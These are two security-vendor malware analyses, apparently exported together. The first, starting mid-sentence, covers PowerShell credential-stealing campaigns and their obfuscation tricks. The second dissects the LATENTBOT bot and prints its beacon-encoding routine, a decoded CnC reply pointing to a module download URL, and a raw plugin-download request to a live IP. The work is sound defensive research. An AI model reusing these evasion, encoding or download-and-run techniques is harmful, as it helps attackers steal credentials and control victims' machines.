  We’ve been investigating PowerShell attacks for years and you can <a href=""https://www.fireeye.com/content/fireeye-www/en_US/blog/threat-research/2015/10/macros_galore.html"" target=""_blank"">read
    more about that here</a>.</p>
 <p>We recently came across some data stealing campaigns in which nearly
  all steps of the attack cycle involved simple yet efficient PowerShell commands.</p>
 <p>One of these – a campaign targeting credentials – involves a
  legitimate looking Russian domain website leading to a well-written
  PowerShell script. Another campaign, also targeting credentials,
  involves an RTF file with German language content that initiates a
  series of PowerShell commands. In both campaigns, protective and
  evasive steps are taken at points throughout the attack cycle.</p>
 <p>
  <span class=""type-M"">Case Study I: A Russia-based data stealing campaign</span></p>
 <p>We observed a Windows executable file in the wild downloading a
  PowerShell script from a legitimate-looking Russian domain website.
  The homepage of the website discusses martial arts, but it also hosts
  the PowerShell script. On execution of the EXE file, a PowerShell
  command to download another PS1 (PowerShell) script is initiated. The
  usage of –hidden switch ensures that the execution of PowerShell
  script is not obvious to the victim in the form of PowerShell window.
  Similarly the execution policy is set as unrestricted to make sure the
  script runs with desired access.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Powershell/powershellfig1.jpg"" /></p>
 <p>
  <span class=""type-XS"">Figure 1: Command to download malicious
    PowerShell script in hidden and unrestricted
    mode.  </span>                                                                        <i>       
    <br /> </i></p>
 <p>
  <b>Password stealing</b></p>
 <p>On accessing the “74.ps1” hosted live on the website, we observed a
  well-written PowerShell script with clear intent to steal data. The
  script copies files from certain locations of the victims’ file system
  that are expected to hold user credentials, as seen below. For
  example, Figure 2 shows the intent to copy “Login Data” file from
  Chrome folder, which contains the usernames and encrypted passwords of
  websites logged in on the Chrome browser.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Powershell/powershellfig2.jpg"" /></p>
 <p>
  <span class=""type-XS"">Figure 2: Command to copy known credential files
    from victims’ system</span></p>
 <p>
  <b>System survey</b></p>
 <p>The script also obtains system metadata (i.e., the victim's
  username, firewall status, and configuration details such as RAM and
  hard disk size), which is converted to an HTML page as shown in Figure 3.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Powershell/powershellfig3.jpg"" /></p>
 <p>
  <span class=""type-XS"">Figure 3: Command to dump system information
    metadata into an HTML file</span></p>
 <p>
  <b>Data extraction</b></p>
 <p>The malware compresses all stolen data into a ZIP archive, as shown
  in Figure 4.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Powershell/powershellfig4.jpg"" /></p>
 <p>
  <span class=""type-XS"">Figure 4: Compressing stolen data to an archive</span></p>
 <p>Once zipped, the stolen data is ready to be sent to the malware
  author via SMTP-related commands. To send it, an email ID and password
  of the malware author is required to be passed as parameters. These
  credentials were visible to us while analyzing the malicious script.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Powershell/powershellfig5.jpg"" />       
    <span class=""type-XS"">Figure 5: Command to send stolen data to
    malware author via email </span></p>
 <p>When the malware is finally run, the malware generates an encrypted
  report titled “My test report.” Reviewing the report, we observed that
  the data is encrypted, as seen in Figure 6.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Powershell/powershellfig6.jpg"" /></p>
 <p>
  <span class=""type-XS"">Figure 6: A section of the encrypted stolen information</span></p>
 <p>
  <b>Decryption of stolen data</b></p>
 <p>As an extra layer of protection, the malware author had implemented
  the RC4 algorithm in the PowerShell script itself and encrypted the
  whole ZIP file, as seen in Figure 7.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Powershell/powershellfig7.jpg"" /></p>
 <p>
  <span class=""type-XS"">Figure 7: RC4 algorithm implemented within PowerShell</span></p>
 <p>Since the malware encrypts the data and does not use any public key
  infrastructure, it has to have the RC4 key visible. This can be seen
  in Figure 8, and ultimately it renders the extra security measure useless.</p>
 <p>                 <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Powershell/powershellfig8.jpg"" />                                                    
    <span class=""type-XS"">Figure 8:<b> </b>RC4 key used by the malware
    author passed as parameter in the script</span></p>
 <p>
  <b>Analyzing the Data Collected</b></p>
 <p>We used the hard-coded key to decrypt the ZIP file and then we
  unzipped the information the malware collected, the results of which
  are shown in Figure 9.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Powershell/powershellfig9.jpg"" /></p>
 <p>
  <span class=""type-XS"">Figure 9: Data collected after decryption and unzipping</span></p>
 <p>The “chrome” file contains information from Google Chrome login
  table. The “CompInfo” HTML file contained metadata of the victim as
  shown in Figure 10.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Powershell/powershellfig10.jpg"" />
  <span class=""type-XS"">Figure 10: HTML containing stolen system information</span></p>
 <p>The CREDHIST file, a component of credential manager, was also
  observed among the stolen data. The CREDHIST file contains
  representation of users’ recent and old account credentials.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Powershell/powershellfig11.jpg"" />
  <span class=""type-XS"">Figure 11: Stolen credhist file</span></p>
 <p>
  <span class=""type-M"">Case Study II: Germany / Austria-based data
    stealing campaign</span></p>
 <p>We observed an RTF file with German language content circulating in
  Germany and Austria. It was found that the RTF file initiates a
  drive-by download, leading to execution of a payload that initiates a
  series of PowerShell commands. In this case, extra care is taken care
  by a PowerShell command to make sure that virtualization is detected.</p>
 <p>
  <b>VM detection</b></p>
 <p>As shown in Figure 12, a list of all running processes is retrieved
  via Get-Process. Among them, the malware checks for services related
  to VirtualBox, VMware, and Parallels. If found, the output will be
  printed on the console.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Powershell/powershellfig12.jpg"" /></p>
 <p>
  <span class=""type-XS"">Figure 12: PowerShell script calculating the
    count of virtualization related processes</span></p>
 <p>If this count is greater than zero, the malware is running in a
  virtualized environment. However, mere output on the console does not
  help the malware author – they will need to use this data. Using
  CONOUT parameter, the information is passed on to the executable.
  Depending on this output, the campaign will continue or abort.</p>
 <p>
  <b>Infection rate 29,000 and counting</b></p>
 <p>The malware adds the number of attacks by visiting a counter website.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Powershell/powershellfig13.jpg"" /></p>
 <p>
  <span class=""type-XS"">Figure 13: Script tracking infection count                              </span></p>
 <p>So far, it has been visited 29,245 times, but this does not
  necessarily mean that 29,245 systems have been infected – some visits
  could have been from cybersecurity researchers.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Powershell/powershellfig14.jpg"" /></p>
 <p>
  <span class=""type-XS"">Figure 14: Infection counter</span></p>
 <p>After a virtualization check and tracking, the malware steals data.
  The malware uses PowerShell to iterate and dump a number of possible
  locations where cookies are stored to the text file, ftshvc.txt.</p>
 <p>
  <b>Command to steal data</b>
                                                                                                                                            
        <i> </i></p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Powershell/powershellfig15.jpg"" />

  <i>                                                                                                                                                                                </i>
  <span class=""type-XS"">Figure 15: Stolen data dumped in a text file</span></p>
 <p>
  <b>Prioritizing stolen data</b></p>
 <p>However, the author is not interested in all the dumped data. They
  prioritize the stolen data by searching for specific strings
  and enabling a counter for it. Within the dumped stolen data, the
  search for credentials includes everything from Facebook to banking
  information sites such as “bankaustria.at” and “credit-suisse.com” (a
  Swiss banking site). The prioritization of stolen data command is
  shown in Figure 16.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Powershell/powershellfig16.jpg"" /></p>
 <p>
  <span class=""type-XS"">Figure 16: Script calculates count of certain
    specific stolen data</span></p>
 <p>
  <b>Making way for new payload</b></p>
 <p>After completing the data theft, the PowerShell script makes way for
  a new payload: Dofoil (yet again, a PowerShell command is used to
  download a file from the malware site and run it via DownloadFile and
  ShellExecute commands). This effectively closes the PowerShell data
  stealing cycle and introduces a new payload, which will connect to the
  command and control (CnC) server and perform other malicious commands.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Powershell/powershellfig17.jpg"" /></p>
 <p>
  <span class=""type-XS"">Figure 17: Script to download and execute new payload</span></p>
 <p>
  <b>More Evasion Techniques</b></p>
 <p>In addition to anti-vm tricks, the malware uses PowerShell features
  such as encoding and quote obfuscation were also used.</p>
 <p>For example, all three commands shown below will launch Notepad.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Powershell/powershellfig18.jpg"" /></p>
 <p>
  <span class=""type-XS"">Figure 18: Three different ways to open notepad
    via PowerShell</span></p>
 <p>Just like a normal command line terminal, PS terminal has no issues
  when strings are broken into quotes. As with command prompt, PS will
  also launch Notepad when “note” ”pad” is typed.</p>
 <p>Additionally, PowerShell provides a –enc (Encoding Command Switch)
  that can enable the user/attacker to write PowerShell commands in Base64.</p>
 <p>
  <b>Evasion via encoding</b></p>
 <p>The following is the PowerShell command observed by a separate
  malware, which uses a –enc switch to hide the activity of first
  calling system sleep (another evasion technique) and then connecting
  to a desired link.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Powershell/powershellfig20.jpg"" /></p>
 <p>
  <span class=""type-XS"">Figure 19: Encoded PowerShell script execution
    in hidden mode</span></p>
 <p>Real PowerShell command after Base64 decryption.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Powershell/powershellfig19.jpg"" /></p>
 <p>
  <span class=""type-XS"">Figure 20: Script after decoding can be observed
    to call sleep and connect to a link</span></p>
 <p>
  <b>Evasion via quote obfuscation</b></p>
 <p>In the following case, when a Word macro executes, it initiates a
  PowerShell script drop that is supposed to launch a VBscript.</p>
 <p>The malware author breaks down the extension as “v” + “bs”. The same
  is passed in command line parameters, which is another bypass attempt
  by breaking the file extension into quotes.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Powershell/powershellfig21.jpg"" /></p>
 <p>
  <span class=""type-XS"">Figure 21: Quote obfuscation to evade plaintext
    string detection</span></p>
 <p>The encoding and obfuscation evasion tricks were also observed in
  document files attached to phishing messages which had embedded
  macros, that also used PowerShell. There has been an increase in
  spreading documents containing embedded malicious macros, and more on
  that can be read <a href=""https://www.fireeye.com/content/fireeye-www/en_US/blog/threat-research/2015/10/macros_galore.html"">here</a>.</p>
 <p>
  <span class=""type-M"">Conclusion</span></p>
 <p>PowerShell is now often used in attacks. The use of PowerShell,
  especially in a corporate environment, should be well regulated and
  monitored with enhanced logging. Execution of encoded and obfuscated
  commands requires an extra degree of observance. Due to PowerShell’s
  ability to encode and obfuscate data, security teams should be aware
  of how PowerShell can be maliciously used and cultivate expertise
  investigating PowerShell attacks.</p>
 <p>The evasion techniques we discussed are not able to bypass FireEye
  appliances, and FireEye provides detection for various stages of such campaigns.</p>
 <p>
  <span class=""type-M"">Reference</span></p>
 <p>[1] <a href=""https://www.fireeye.com/content/fireeye-www/en_US/blog/threat-research/2015/10/macros_galore.html"">https://www.fireeye.com/blog/threat-research/2015/10/macros_galore.html</a></p>",http://www.fireeye.com/blog/threat-research/2015/12/uncovering_activepower.html
LATENTBOT: Trace Me If You Can,"<p>FireEye Labs recently uncovered LATENTBOT, a new, highly obfuscated
  BOT that has been in the wild since mid-2013. It has managed to leave
  hardly any traces on the Internet, is capable of watching its victims
  without ever being noticed, and can even corrupt a hard disk, thus
  making a PC useless.</p>
 <p>Through our Dynamic Threat Intelligence (DTI), we have observed
  multiple campaigns targeting multiple industries in the United States,
  United Kingdom, South Korea, Brazil, United Arab Emirates, Singapore,
  Canada, Peru and Poland – primarily in the financial services and
  insurance sectors. Although the infection strategy is not new, the
  final payload dropped – which we named LATENTBOT – caught our
  attention since it implements several layers of obfuscation, a unique
  exfiltration mechanism, and has been very successful at infecting
  multiple organizations.</p>
 <p>Some of the main features of LATENTBOT are listed below:<br />
  <br /> a)    Multiple layers of obfuscation<br /> b)    Decrypted
  strings in memory are removed after being used<br /> c)    Hiding
  applications in a different desktop<br /> d)    MBR wiping
  ability<br /> e)    Ransomlock similarities such as being able to lock
  the desktop<br /> f)    Hidden VNC Connection<br /> g)    Modular
  design, allowing easy updates on victim machines<br /> h)    Stealth:
  Callback Traffic, APIs, Registry keys and any other indicators are
  decrypted dynamically<br /> i)    Drops Pony malware as a module to
  act as infostealer<br /> <br /> <span class=""type-M"">LATENTBOT Overview</span>
  <br /> <br /> Stealth being one of its traits, LATENTBOT will only
  keep malicious code in memory for the short time that is needed. Most
  of the encoded data is found either in the program resources or in the
  registry. A custom encryption algorithm is shared across the different
  components, including in encrypting its command and control (CnC)
  communications. Due to this, its family binaries are detected with a
  generic name such as Trojan.Generic:<br /> <br /> <a href=""https://www.virustotal.com/en/file/39af310076282129e6a38ec5bf784ff9305b5a1787446f01c06992b359a19c05/analysis/"" target=""_blank"">https://www.virustotal.com/en/file/39af310076282129e6a38ec5bf784ff9305b5a1787446f01c06992b359a19c05/analysis/</a><br />
  <br /> LATENTBOT itself is not targeted in nature – it has been
  observed in multiple industries – but it is selective in the types of
  Windows systems to infect. For example, it won’t run in Windows Vista
  or Server 2008. LATENBOT also uses compromised websites as CnC
  infrastructure, making infection easier and detection harder.<br />
  <br /> Based on passive DNS information and similar samples found in
  the wild, it is possible that LATENTBOT was created around mid-2013.
  Throughout the course of 2015, we observed multiple successful
  infection campaigns, as seen in Figure 1.<br /> <br />  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/LATENTBOT/latentbotfig1.jpg"" />
  <br /> <br /> Figure 1: Targeted Countries and LATENTBOT CnC
  Locations<br /> <br /> <span class=""type-M"">Infection Vector</span>
  <br /> <br /> The preliminary steps to infect victims with LATENTBOT
  already contains multiple layers of obfuscation as described in Figure
  2: Infection Phase.<br /> <br /> <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/LATENTBOT/latentbotfig2.jpg"" />
  <br />  <br /> <span class=""type-XS"">Figure 2: Infection Phase</span>
  <br /> <br /> <span class=""type-M"">Step 1</span>
  <br /> <br /> Malicious emails containing an old Word exploit are
  created with the Microsoft Word Intruder<a href=""https://www.fireeye.com/blog/threat-research/_jcr_content.feed#_ftn1"" name=""_ftnref1""></a>[1] (MWI) builder and sent to the victims.<br />
  <br /> <span class=""type-M"">Step 2</span>
  <br /> <br /> When the attached Word document is opened, an embedded
  malicious executable runs, beaconing to the MWISTAT Server (see Figure
  3) for two main purposes:<br /> <br /> 1.    Campaign tracking<br />
  2.    Second stage binary download</p>
 <p>
  <br />  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/LATENTBOT/latentbotfig3.jpg"" />
  <br /> <span class=""type-XS"">Figure 3: MWI Beacon</span>
  <br />                     <br /> During our analysis, the Word
  documents downloaded LuminosityLink as the second stage binary.
  LuminosityLink is a full-featured RAT that has the ability to steal
  passwords, record keystrokes, transfer files and activate attached
  microphones or webcams.<br /> <br /> <span class=""type-M"">Step 3</span>
  <br /> <br /> Since LuminosityLink is a RAT that offers multiple
  capabilities to fully control the infected box, it is surprising that
  the RAT downloaded another payload from a secondary CnC at
  emenike[.]no-ip.info (180.74.89.183). This new module is LATENTBOT
  which offers new capabilities that will be detailed in this
  report.<br /> <br /> <span class=""type-M"">Dissecting LATENTBOT</span>
  <br /> <br /> The analysis will concentrate on the third stage
  LATENTBOT binary <span class=""code"">lsmm.exe
  </span>(af15076a22576f270af0111b93fe6e03) dropped in Step 3 above, but
  we are far from the final stage. Another similar binary that was part
  of our analysis is <span class=""code"">aya.exe
  </span>(1dd0854a73288e833966fde139ffe385), which performs the same
  actions. Let’s take an in-depth look at this interesting piece of
  malware.<br /> <br /> LATENTBOT is an obfuscated .NET binary, which
  contains an encoded resource object. This object is the fourth stage
  payload that is decoded using the algorithm seen in Figure 4.<br />
  <br />  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/LATENTBOT/latentbotfig4.jpg"" />
  <br /> <br /> <span class=""type-XS"">Figure 4: XOR routine to decode
    embedded resource</span></p>
 <p>The fourth stage payload is also a .NET binary protected and
  obfuscated with <span class=""code"">ConfuserEx
  v0.5.0-10-g6ebeec5.</span>The fourth stage binary will open the .NET
  programs: <span class=""code"">RegAsm.exe and CvTres.exe</span> from
    <span class=""code"">%windir%\Microsoft
  .Net\Framework\v2.050727\</span> and use process hollowing to replace
  them with malicious code in memory.<br /> <br /> The <span class=""code"">CvTres.exe</span> process is replaced with a Visual Basic
  UPX-packed binary extracted from the binary’s resources, as seen in
  Figure 5.<br /> <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/LATENTBOT/latentbotfig5.jpg"" />
  <br />  <br /> <span class=""type-XS"">Figure 5: Process hollowing to
    replace the contents of CvTres.exe in memory</span></p>
 <p>The binary creates a registry key for persistence with the hardcoded
  binary name <span class=""code"">dlrznz68mkaa.exe </span>(a copy of the
  original <span class=""code"">aya.exe</span>) at the location shown in
  Figure 6:<br /> <br /> <span class=""code"">HKCU\Software\Microsoft\Windows NT\CurrentVersion\Windows\load</span>
  <br /> <br />  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/LATENTBOT/latentbotfig6.jpg"" />
  <br /> <br /> <span class=""type-XS"">Figure 6: LATENTBOT persistence</span>
  <br /> <br /> The folder <span class=""code"">aFwLiiV</span> and
  filename <span class=""code"">dlrznz68mkaa.exe</span> are hardcoded in
  the resources section of the <span class=""code"">Confuser</span> .NET
  binaries. Figure 7 shows the resources content from <span class=""code"">aya_decrypted.exe</span>.</p>
 <p>
  <br /> <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/LATENTBOT/latentbotfig7.jpg"" />
  <br />  <br /> <span class=""type-XS"">Figure 7: Confuser .NET resources
    showing malicious directory and file name</span>
  <br /> <br /> <span class=""code"">RegAsm.exe</span> will be replaced in
  memory with a shellcode loader that opens <span class=""code"">%windir%\system32\svchost.exe</span> and uses the same
  process hollowing technique to load a second shellcode loader that
  eventually will decode and execute a fifth stage Delphi binary in
  memory.<br /> <br /> At this point, let’s see the new stages
  discovered in Figure 8:<br /> <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/LATENTBOT/latentbotfig8.jpg"" />
  <br />  <br /> <br /> <span class=""type-XS"">Figure 8: The many stages
    of LATENTBOT</span>
  <br /> <br /> Figure 9 shows a quick view of one of the decoder
  functions inside the second shellcode loader that eventually decrypts
  the fifth stage Delphi Binary:<br /> <br />  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/LATENTBOT/latentbotfig9.jpg"" />
  <br /> <br /> <span class=""type-XS"">Figure 9: Complex decoder function</span></p>
 <p>
  <span class=""type-M"">Fifth Stage Delphi Binary</span>
  <br /> <br /> This is another launcher that uses the same process
  hollowing technique we saw previously to execute the sixth stage
  binary in another instance of <span class=""code"">svchost.exe</span>.
  This new binary is encoded in the resources section and decoded at
  runtime with the function from Figure 10.<br /> <br /> <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/LATENTBOT/latentbotfig10.jpg"" />
  <br />  <br /> <span class=""type-XS"">Figure 10: Decoder for sixth
    stage binary</span></p>
 <p>The process tree at this point with <span class=""code"">aya.exe</span>, <span class=""code"">RegAsm.exe</span> and
  the two instances of <span class=""code"">svchost.exe</span> can be seen
  using the Process Explorer tool in Figure 11, with the sixth stage
  being suspended:</p>
 <p>
  <br /> <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/LATENTBOT/latentbotfig11.jpg"" />
  <br />  <br /> <span class=""type-XS"">Figure 11: Multiple Injections View</span>
  <br /> <br /> <span class=""type-M"">Sixth Stage Delphi Binary</span>
  <br /> <br /> The sixth stage is highly obfuscated; multiple encoded
  strings can bee seen which represent API function names, CnC IP,
  POST/GET parameters, HTTP headers, processes names, and so on, all of
  which are decrypted at runtime.  <br /> <br /> First the malware will
  performs several validations. If the Windows OS version is 6.0
  (Windows Vista, Windows Server 2008) or if the malware’s parent
  process is not <span class=""code"">svchost.exe</span> or <span class=""code"">explorer.exe</span> (see Figure 12) then it will
  exit.<br /> <br /> <span class=""type-M"">Running Out of Battery?</span>
  <br /> <br /> If LATENTBOT is running on a laptop, it will query the
  battery status via <span class=""code"">GetSystemPowerStatus</span> and
  if the battery is running Low or Critical, it will call <span class=""code"">SetThreadExecutionState</span> try to prevent the system
  from sleeping or turning the display off.<br /> <br /> <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/LATENTBOT/latentbotfig12.jpg"" />
  <br />  <br /> <span class=""type-XS"">Figure 12: Processes names
    decrypted to be validated</span>
  <br /> <br /> <span class=""type-M"">Is the BOT_Engine plugin installed?</span>
  <br /> <br /> Now LATENTBOT will check if its plugins are already
  downloaded by querying the registry key below which should contain
  subkeys with the encrypted modules:<br /> <br /> <span class=""code"">HKCU\Software\Google\Update\network\secure</span>
  <br /> <br /> If plugins are found, LATENTBOT will proceed to load
  BOT_ENGINE, which is the main module (described in more detail below).
  Otherwise, it will download the required plugins from a CnC server as
  explained in the next section.<br /> <br /> <span class=""type-M"">Data Exfiltration</span>
  <br /> <br /> If the plugins were not found, LATENTBOT will proceed to
  download them, but it will first validate that the connection to the
  CnC server is alive by making the TTP request shown in Figure
  13:<br /> <br />  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/LATENTBOT/latentbotfig13.jpg"" />
  <br /> <span class=""type-XS"">Figure 13:  LATENTBOT initial beacon</span>
  <br /> <br /> LATENTBOT then verifyies that the HTTP response is one
  of the following:<br /> <br /> •    200: The requested resource was
  found<br /> •    302: Found but in a different URI (Redirection)<br />
  •    307: Similar to 302<br /> <br /> If none of the valid HTTP
  responses shown above are received, it will try to connect again every
  20 seconds indeterminately.<br /> <br /> Assuming a valid HTTP
  response was received, LATENTBOT will proceed to generate a beacon.
  First, the URI is generated based on information from the infected
  host; two examples are shown below:<br /> <br />
  forum?datael=US-20-503634784811&amp;ver=4006&amp;os=2&amp;acs=0&amp;x64=0&amp;gr=load-1.7.1.20&amp;random=wopvrudsks<br />
  <br />
  forum?datael=US-70-347126827175&amp;ver=4006&amp;os=5&amp;acs=0&amp;x64=0&amp;gr=load-1.7.1.20&amp;random=dbvcwhctdn<br />
  <br /> Where:<br /> •    All the GET parameters are decoded at
  runtime. For example,<span class=""code""> tgsz0D</span> decodes to
    <span class=""code"">&amp;gr</span>.<br /> •    <span class=""code"">datael:
  &lt;locale&gt;-&lt;OS_Version&gt;-&lt;random_number&gt;</span>, where
    &lt;<span class=""code"">OS_Version</span>&gt; is one of the
  following:<br />     o    10 = Windows 2000 (5.0)<br />     o    20 =
  Windows XP (5.1)<br />     o    30 = Windows XP 64-Bit, Windows Server
  2003/R (5.2)<br />     o    40 = Windows Vista, Windows 2008
  (6.0)<br />     o    70 = Windows 7, Windows Server 2008 R2
  (6.1)<br />     o    80 = Windows 8, Windows Server 2012<br />     o  
   90 = Windows 8.1, Windows Server 2012 R2<br /> •    <span class=""code"">random</span> and the &lt;<span class=""code"">random_number</span>&gt; used by datael are set
  dynamically. For <span class=""code"">random</span>, 10 characters are
  randomly selected from the buffer <b>abcdefghijklmnopqrstuvxyz</b>.
    <span class=""code"">datael</span> randomly selects 12 integers from
  the buffer <b>0123456789012345678912345678</b>. The seed is
  initialized with the Delphi function <b>Randomize()</b>and the Delphi
    <b>Random() </b>function is called on each loop iteration, making
  the callback different on each request.<br />     o    Note: The
    &lt;<span class=""code"">random_number</span>&gt; is stored in the
  following registry key (created at runtime): <span class=""code"">\HKCU\Software\Adobe\Adobe Acrobat\data</span>
  <br /> •    os: Windows OS Major version, using the same codes as
    <span class=""code"">OS_Version </span>above.<br /> •    acs: possible
  values are 1 or 0. 1 is used if the malware is running under SYSTEM
  privileges.<br /> •    x64: flag identifying the OS
  architecture.<br /> •    The ver and gr parameter values are
  hardcoded.<br /> <br /> Then the URI is encoded using a three steps
  algorithm. The following will describe each step:<br /> <br /> <span class=""type-M"">Step 1: Custom substitution routine</span>
  <br /> <br /> This routine substitutes valid URI characters using
  custom hardcoded lookup tables, depending on the usage
  (encoding/decoding) different lookup tables are used. Figure 14 shows
  the lookup table used during the decoding phase:<br />  <br />
                     <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/LATENTBOT/latentbotfig14.jpg"" />
  <br /> <span class=""type-XS"">Figure 14:  Decoding lookup table</span></p>
 <p>This routine encodes/decodes one WORD at a time, each byte is
  shifted right or left depending on the need (encoding/decoding) with a
  specific value depending on the byte position as shown in Table
  1:<br /> <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/LATENTBOT/latentbotnewfig1.jpg"" />
  <br /> </p>
 <p>
  <span class=""type-XS"">Table 1: Shift values</span></p>
 <p>The result is added after each shift, as shown in Figure 15.<br />
    <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/LATENTBOT/latentbotfig15new.jpg"" />
  <br /> <br /> <span class=""type-XS"">Figure 15: Shift calculations</span>
  <br /> Note: For encoding, depending on a parameter, the substitution
  routine can choose from three different lookup tables; for this
  sample, only one lookup table was used every time.</p>
 <p>
  <span class=""type-M"">Step 2: XOR Modifier</span></p>
 <p>The substituted data is passed is passed ot the XOR modifier shown
  in Figure 16.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/LATENTBOT/latentbotfig15.jpg"" />
  <br /> <br /> <span class=""type-XS"">Figure 16: XOR Modifier routine</span>
  <br /> <br /> Different XOR modifiers are used as shown in Table 2:</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/LATENTBOT/latentbottable1.jpg"" />
  <br /> </p>
 <p>
  <span class=""type-XS"">Table 2: XOR modifier</span>
  <br /> <br /> The same XOR modifier algorithm has been used by
  iBanking/TauSpy Android malware<a href=""https://www.fireeye.com/blog/threat-research/_jcr_content.feed#_ftn1"" name=""_ftnref1""></a>[2].<br /> <br /> <span class=""type-S"">Step 3:
    Base64 encoding</span>
  <br /> <br /> The resulting encoded URI is then base64 encoded.<br />
  <br /> The whole algorithm can be expressed as follows:<br />
  Encryption:<br /> <span class=""code"">encoded_uri </span> =<b>
    base64_encode(substitute (xor_modifier</b>(modifier, <span class=""code"">plain_text_uri</span>)))<br /> Decryption:<br /> <span class=""code"">plain_text_uri</span> = <b>xor_modifier</b>(modifier,
    s<b>ubstitute(base64_decode</b>(<span class=""code"">encoded_uri</span>)))<br /> <br /> By applying the
  substitution and XOR algorithms described above to the original
  URI:<br /> <br /> <span class=""code"">forum?datael=US-20-503634784811&amp;ver=4006&amp;os=2&amp;acs=&amp;x64=0&amp;gr=load-1.7.1.20&amp;random=wopvrudsks</span>
  <br /> <br /> we get the following encoded URI:<br /> <br /> <span class=""code"">Adl7k+v9qQGCaZti0LS9v++uFb6axeFE2twthNT9s3K6/oG0xjQS2Gqk+Udja91kch3nwphGANCtdr83tXSAaLJEi/qmG3xmKKPwR8lFncN9i93yfHRxFQ2EBC</span>
  <br /> <br /> This URI is transformed with standard Base64 encoding,
  resulting in:<br /> <br /> <span class=""code"">QWRsN2srdjlxUUdDYVp0aTBMUzl2Kyt1RmI2YXhlRkUydHd0aE5UOXMzSzYvb0cweGpRUzJHcWsrVWRqYTkxa2NoM253cGhHQU5DdGRyODN0WFNBYUxKRWkvcW1HM3htS0tQd1I4bEZuY045aTkzeWZIUnhGUTJFQkM=</span>
  <br /> <br /> Which finally is used to send the beacon shown in Figure
  17:<br /> <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/LATENTBOT/latentbotfig17new.jpg"" />
  <br /> <span class=""type-XS"">Figure 17: Fully encoded LATENTBOT beacon</span></p>
 <p>The CnC replies with:<br /> <span class=""code"">MDVvWVc2K3J5ZGV4ZlNyM0lycjQ5TFhkSnBmZWJTbms1Zkx0aEQzNWxqaFlqVS9XczN4MTNqV1RQOWtHWUF1ZERidzdkR0ZOdjI1UHAzT1pYcktBM2l5OGlWU04zMjByZDExOFNVREdObDk3QjdPNWtQUjhBU05jcjVybXR1Mkg=</span>
  <br /> <br /> The decoded URI yields:<br /> <br /> <span class=""code"">mod:http://46.165.246.234/m/:Bot_Engine-A35CB08FB078051B27894BCD380EAC43-229376-018701-881384-8;</span>
  <br /> <br /> Which is actually the name of a module (<span class=""code"">Bot_Engine</span>, and a unique ID) to be downloaded
  later during execution.<br /> <br /> <span class=""type-M"">Downloading
    the Plugins</span>
  <br /> <br /> At this point, LATENTBOT is ready to start downloading
  the different plugins by sending the beacon shown in Figure 18:<br />
  <br /> <span class=""code"">GET /m/484588.zip HTTP/1.1<br />
    Content-Type: application/x-www-form-urlencoded<br />  User-Agent:
    Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1;
    Trident/5.0)<br />  Host: 37.220.9.229<br />  Cache-Control: no-cache</span>
  <br /> <br /> <span class=""type-XS"">Figure 18: LATENTBOT download beacon</span>
  <br /> <br /> The modules names pretend to be ZIP files but are in
  fact encoded data that is saved into the registry key <span class=""code"">secure</span> as shown in Figure 19.<br /> <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/LATENTBOT/latentbotfig18.jpg"" />
  <br /> <br /> <span class=""type-XS"">Figure 19: Registry keys storing
    the malicious plugins</span></p>
 <p>Decrypting the plugin names using the XOR modifier algorithm from
  Figure 16 with modifier <span class=""code"">0x2328</span> gives the
  following module names:<br /> 1.    hdtWD3zyxMpSQB = <b>Bot_Engine</b>
  <br /> 2.    QdW/DoI2F9J = <b>Security</b>
  <br /> 3.    RRrIibQs+WzRVv5B+9iIys+17huxID = <b>Remote_desktop_service</b>
  <br /> 4.    VRWVBM6UtH6F+7UcwkBKPB = <b>Vnc_hide_desktop</b>
  <br /> 5.    zRlBb9ofmNVErtdu = <b>Pony_Stealer</b>
